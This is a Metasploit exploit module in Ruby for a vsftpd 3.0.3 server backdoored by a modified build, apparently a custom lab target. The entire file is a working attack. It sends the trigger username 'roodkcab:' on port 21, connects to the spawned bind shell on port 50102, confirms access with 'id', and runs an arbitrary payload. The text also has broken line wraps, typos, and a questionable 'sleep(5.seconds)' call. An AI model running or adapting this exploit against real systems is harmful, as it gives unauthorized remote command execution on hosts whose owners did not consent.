##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'VSFTPD v3.0.3 amdorj Backdoor Command Execution',
      'Description'    => %q{
          This module exploits a propreitary vulnerablility in VSFTPd Server 3.0                                                                                        .3 implemented by amdorj. It sends a string to
the server on port 21 and spawns a shell on port 50102. This vulnerability is no                                                                                        t included in the release and was added by
modifying the source code.
      },
      'Author'         => [ 'hdm', 'MC', 'amdorj' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'OSVDB', 'N/A'],
          [ 'URL', 'http://pastebin.com/AetT9sS5'],
          [ 'URL', 'http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-                                                                                        download-backdoored.html' ],
        ],
      'Privileged'     => true,
      'Platform'       => [ 'unix' ],
      'Arch'           => ARCH_CMD,
      'Payload'        =>
        {
          'Space'    => 2000,
          'BadChars' => '',
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType'    => 'cmd_interact',
              'ConnectionType' => 'find'
            }
        },
      'Targets'        =>
        [
          [ 'Automatic', { } ],
        ],
      'DisclosureDate' => 'N/A',
      'DefaultTarget' => 0))

    register_options([ Opt::RPORT(21) ])
  end

  def exploit

    nsock = self.connect(false, {'RPORT' => 50102}) rescue nil
    if nsock
      print_status("The port used by the backdoor bind listener is already open"                                                                                        )
      handle_backdoor(nsock)
      return
    end

    # Connect to the FTP service port first
    connect

    banner = sock.get_once(-1, 30).to_s
    print_error("Banner: #{banner.strip}")

    sock.put("USER roodkcab: \r\n")
    resp = sock.get_once(-1, 30).to_s
    print_status("USER: #{resp.strip}")

    if resp =~ /^530 /
      print_error("This server is configured for anonymous only and the backdoor                                                                                         code cannot be reached")
      disconnect
      return
    end

    if resp !~ /^331 /
      print_error("This server did not respond as expected: #{resp.strip}")
      disconnect
      return
    end

    sock.put("PASS #{rand_text_alphanumeric(rand(6)+1)}\r\n")
sleep(5.seconds)
    # Do not bother reading the response from password, just try the backdoor
    nsock = self.connect(false, {'RPORT' => 50102}) rescue nil
    if nsock
      print_good("Backdoor service has been spawned, handling...")
      handle_backdoor(nsock)
      return
    end

    disconnect

  end

  def handle_backdoor(s)

    s.put("id\n")

    r = s.get_once(-1, 5).to_s
    if r !~ /uid=/
      print_error("The service on port 50102 does not appear to be a shell")
      disconnect(s)
      return
    end

    print_good("UID: #{r.strip}")

    s.put("nohup " + payload.encoded + " >/dev/null 2>&1")
    handler(s)
  end
end
